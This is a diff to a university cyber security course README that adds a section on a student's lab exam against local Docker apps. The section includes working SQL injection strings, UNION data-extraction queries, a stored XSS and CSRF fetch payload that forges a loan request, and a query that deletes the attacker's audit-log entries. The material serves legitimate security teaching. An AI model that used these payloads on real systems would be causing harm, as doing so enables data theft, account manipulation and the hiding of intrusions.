@@ -1,8 +1,22 @@
 # CSE 406 — Cyber Security
 
+> **Course:** CSE 406 · Cyber Security Sessional · BUET · January 2026  
+> **Student ID:** 2105032  
+
+---
+
+## 📑 Table of Contents
+
+- [Offline 1 — Cryptography (Diffie-Hellman + AES)](#offline-1--cryptography-diffie-hellman--aes) · [📁 Folder README](Offline-1-Crypto/readme.md)
+- [Online 1 — Buffer Overflow](#online-1--buffer-overflow) · [📁 Folder README](Online-1-Buffer-Overflow/readme.md)
+- [Offline 2 — Side-Channel Timing Attack](#offline-2--side-channel-timing-attack) · [📁 Folder README](Offline-2-Side-Channel-Attack/readme.md)
+- [Online 2 — Ethical Hacking (SQLi ➔ Stored XSS ➔ CSRF ➔ Anti-Forensics)](#online-2--ethical-hacking) · [📁 Folder README](Online-2-Ethical-Hacking/readme.md)
+
 ---
 
 ## Offline 1 — Cryptography (Diffie-Hellman + AES)
+
+> 📖 **Comprehensive Guide:** See [`Offline-1-Crypto/readme.md`](Offline-1-Crypto/readme.md) for full cipher theory, round operations, and mark breakdown.
 
 **Goal.** Implement a symmetric-key cryptosystem where the AES key is
 securely agreed between sender and receiver using Diffie-Hellman key
@@ -10,6 +24,7 @@ exchange over a finite field, then used to encrypt and decrypt
 plaintext transmitted over an arbitrary channel.
 
 The full task statement is in [`CSE406_Assignment1_v1.pdf`](Offline-1-Crypto\res\CSE406_Assignment1_v1.pdf).
+The full task statement is in [`CSE406_Assignment1_v1.pdf`](Offline-1-Crypto/res/CSE406_Assignment1_v1.pdf).
 
 ### Cryptosystem at a glance
 
@@ -176,6 +191,8 @@ Offline-1-Crypto/
 
 ## Online 1 — Buffer Overflow
 
+> 📖 **Comprehensive Guide:** See [`Online-1-Buffer-Overflow/readme.md`](Online-1-Buffer-Overflow/readme.md) for detailed memory layout diagrams, tutorial step-throughs, and past exam archives.
+
 **Goal.** Understand and exploit stack-based buffer overflows, heap overflows, BSS/data overflows, and function chaining under varying system environments and security mitigations (e.g., ASLR, Stack Canaries, and non-executable stacks).
 
 ### 1. Practice Materials & Lab Folders
@@ -291,6 +308,8 @@ sudo chmod 4755 target
 
 ## Offline 2 — Side-Channel Timing Attack
 
+> 📖 **Comprehensive Guide:** See [`Offline-2-Side-Channel-Attack/readme.md`](Offline-2-Side-Channel-Attack/readme.md) for full statistical latency analysis, timing charts, noise filtering, and edge-case handling.
+
 **Goal.** Simulate a remote timing side-channel attack against a
 black-box authentication server that compares a submitted PIN
 character-by-character (short-circuiting on the first mismatch).
@@ -367,3 +386,134 @@ Offline-2-Side-Channel-Attack/
         template.py                                     # Provided starter template
         server_linux / server_mac / server_windows.exe   # Black-box target server binaries (gitignored)
 ```
+
+---
+
+## Online 2 — Ethical Hacking (SQLi ➔ Stored XSS ➔ CSRF ➔ Anti-Forensics)
+
+> 📖 **Comprehensive Guide:** See [`Online-2-Ethical-Hacking/readme.md`](Online-2-Ethical-Hacking/readme.md) for full section specs, Docker architectures, automated encoders, and cheatsheets.
+
+**Goal.** Execute a coordinated, multi-service ethical hacking attack against containerized campus web applications. Exploit SQL injection to bypass login and enumerate backend schemas, persist client-side stored XSS payloads via stacked queries, trigger cross-application CSRF attacks to manipulate victim accounts, and clean forensic audit trails.
+
+### Multi-Service Attack Pipeline
+
+```
+Attacker ──[1. SQLi Auth Bypass & UNION Extraction]──► Primary Portal (Port 7000/4000)
+   │                                                         │
+   ├──[2. Stacked Query: Inject Stored XSS into Profile]─────┘
+   │
+   ├──[3. Trigger Stored XSS: Auto-posts to Secondary App]──► Secondary App (Port 7001/4001)
+   │                                                                 │
+Victim ◄──[4. Victim views message / clicks link in Secondary App]───┘
+   │
+   └──[5. Victim's browser executes background CSRF fetch()]──► Primary Portal (Action executed!)
+   │
+Attacker ──[6. Stacked Query: DELETE FROM log WHERE id = ...]─► Primary Portal (Audit trail sanitized)
+```
+
+### 1. Section A2 — Loan Portal & Student Chat (Live Exam Solved by 2105032)
+
+- **Target Systems:** Loan Management Portal (`http://localhost:7000`) & Student Chat (`http://localhost:7001`).
+- **Student ID:** `2105032` (Attacker account: `9900001` / `meherun.nesa`, Victim account: `9900002` / `shafayet.islam`).
+- **Task 1 — SQL Injection Confirmation (1 mark):**
+  - Injecting `nesa-99' or '1'='1` into the password field on `http://localhost:7000/login` bypasses credential verification and authenticates as Meherun Nesa.
+- **Task 2 — Schema Discovery (2 marks):**
+  - Determining column count: `nesa-99' order by 6 -- -` confirms 6 columns.
+  - Reflected columns: 2, 3, 4, 6.
+  - Database discovery: `' union select 1,'','',database(),5,'' -- -` ➔ `a2_loan`.
+  - Table discovery: `' union select 1,'','',group_concat(table_name),5,'' from information_schema.tables where table_schema='a2_loan' -- -` ➔ `loan`, `log`.
+  - Column mapping: `student_id`, `first_name`, `last_name`, `username`, `password`, `loan_amount` in table `loan`; `id`, `submitted_username`, `submitted_password`, `attempted_at` in table `log`.
+- **Task 3 — Complete Loan-Amount Extraction (2 marks):**
+  - Query: `' union select 1, '', '', group_concat(student_id, ' ', first_name, ' ', last_name, ' - ', loan_amount, '<br>'), 5, '' from loan -- -`
+  - Extracted all 15 student records (e.g., `9900001 Meherun Nesa - 1250.00`, `9900002 Shafayet Islam - 3400.50`, up to `9900015 Ibrahim Khalil - 3675.90`).
+- **Task 4 — Persistent Browser Payload (1 mark):**
+  - Exploits `multipleStatements: true` in `mysql2` to execute a stacked `UPDATE` statement, persisting HTML/JS into `last_name`:
+    ```sql
+    nesa-99'; update loan set last_name = '<i>Nesa</i>' where student_id = 9900001 -- -
+    ```
+- **Task 5 — Cross-Application CSRF Weaponization (4 marks):**
+  - Attacker injects a script into `last_name` that sends an automated chat message containing an embedded payload to `http://localhost:7001/send`:
+    ```sql
+    nesa-99';
+    update loan set last_name = concat(
+        last_name,
+        '<script>fetch("http://localhost:7001/send", {"credentials": "include", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "body=%3Cscript%3Efetch(%22http://localhost:7000/request-loan%22,%7B%22credentials%22:%22include%22,%22headers%22:%7B%22Content-Type%22:%22application/x-www-form-urlencoded%22%7D,%22body%22:%22amount=1000%22,%22method%22:%22POST%22%7D);%3C/script%3E", "method": "POST"});</script>'
+    ) where student_id = 9900001; -- -
+    ```
+  - When victim Shafayet opens Student Chat, his browser executes the payload and fires a `POST http://localhost:7000/request-loan` request with `amount=1000`, increasing his loan balance from `$3400.50` to `$4400.50`.
+- **Bonus — Forensic Log Cleanup (+1 mark):**
+  - Purges only the attacker's forensic traces while leaving all other audit trails untouched:
+    ```sql
+    nesa-99'; DELETE FROM log WHERE id = 9900001; -- -
+    ```
+- Complete submission log preserved in [`Online-2-Ethical-Hacking/A2-Ethical-Hacking/2105032.txt`](Online-2-Ethical-Hacking/A2-Ethical-Hacking/2105032.txt).
+
+### 2. Other Exam Variations Summary
+
+* **Section A1 — Library Fines Portal & Campus Marketplace:**
+  - Apps: Library Fines (`http://localhost:4000`) & Campus Marketplace (`http://localhost:4001`).
+  - Vulnerability: Unescaped template literal in PIN field. Stacked queries against `a1_fines` database (`member`, `fine_record`, `log`). Stored XSS injected into oversized `member.last_name` (`VARCHAR(1200)`). CSRF triggers victim to post unauthorized items to Marketplace. Verified walkthrough in [`A1fullSolve.md`](Online-2-Ethical-Hacking/A1-Ethical-Hacking/A1fullSolve.md).
+* **Section B1 — Gym Check-In Portal & Campus Forum:**
+  - Apps: Gym Check-In & Campus Forum. Database `b1_gym` (`membership`, `log`). Stacked SQLi persists XSS into victim `7700002`'s profile; automated CSRF checks victim in on the forum.
+* **Section C1 — Course Registration Portal & Study Group Chat:**
+  - Apps: Course Registration & Study Group Chat. Database `c1_registration` (`registration`, `log`). Extracts tuition balances; CSRF forces victim to drop or enroll in courses.
+
+### 3. Practice Application & Master Guides
+
+* **Dockerized Practice Stack (`Ethical-Hacking-Practice-Problem/`):**
+  - Full local test environment with `result-site` (port 3000) and `social-site` (port 3001), complete Node.js/Express source code, and MySQL schema initialization scripts.
+* **Exam Preparation & Cheatsheet (`Practice/`):**
+  - [`cheatsheet.md`](Online-2-Ethical-Hacking/Practice/cheatsheet.md): Copy-paste payloads for SQLi, XSS, and CSRF.
+  - [`full-pipeline.md`](Online-2-Ethical-Hacking/Practice/full-pipeline.md): Comprehensive theoretical guide covering each attack stage.
+  - [`EXAM_PREPARATION_MASTER_GUIDE.md`](Online-2-Ethical-Hacking/Practice/EXAM_PREPARATION_MASTER_GUIDE.md): Master strategy handbook.
+
+### How to Run It
+
+```bash
+# 1. Navigate to target challenge folder
+cd Online-2-Ethical-Hacking/A2-Ethical-Hacking
+
+# 2. Load container images and launch stack
+docker load --input A2-images.tar
+docker compose up -d
+
+# 3. Check running services
+docker compose ps
+
+# 4. Reset environment to clean state
+docker compose down -v
+docker compose up -d
+```
+
+### File Layout
+
+```
+Online-2-Ethical-Hacking/
+├── readme.md                           # Comprehensive documentation
+├── A1-Ethical-Hacking/                 # Section A1: Library Fines & Campus Marketplace
+│   ├── A1-spec.pdf                     # Specification
+│   ├── A1fullSolve.md                  # Verified solution walkthrough
+│   └── compose.yaml                    # Docker Compose file
+├── A2-Ethical-Hacking/                 # Section A2: Loan Portal & Student Chat (Solved by 2105032)
+│   ├── A2-spec.pdf                     # Specification
+│   ├── 2105032.txt                     # Student live submission & payloads
+│   └── compose.yaml                    # Docker Compose file
+├── B1-Ethical-Hacking/                 # Section B1: Gym Check-In & Campus Forum
+│   ├── B1-spec.pdf                     # Specification
+│   ├── B1.txt                          # Solution notes & reproduction steps
+│   └── compose.yaml                    # Docker Compose file
+├── C1-Ethical-Hacking/                 # Section C1: Course Registration & Study Group Chat
+│   ├── C1-spec.pdf                     # Specification
+│   ├── C1.txt                          # Solution notes & reproduction steps
+│   └── compose.yaml                    # Docker Compose file
+├── Ethical-Hacking-Practice-Problem/   # Fully runnable reference applications
+│   ├── docker-compose.yml              # Local Docker Compose setup
+│   ├── result-site/                    # Source code for primary vulnerable portal (port 3000)
+│   ├── social-site/                    # Source code for secondary social portal (port 3001)
+│   └── mysql-init/                     # Database schemas and seed data
+└── Practice/                           # Reference cheat sheets & preparation guides
+    ├── cheatsheet.md                   # Quick copy-paste payload reference
+    ├── full-pipeline.md                # Comprehensive attack pipeline guide
+    └── EXAM_PREPARATION_MASTER_GUIDE.md# Master exam survival handbook
+```
+
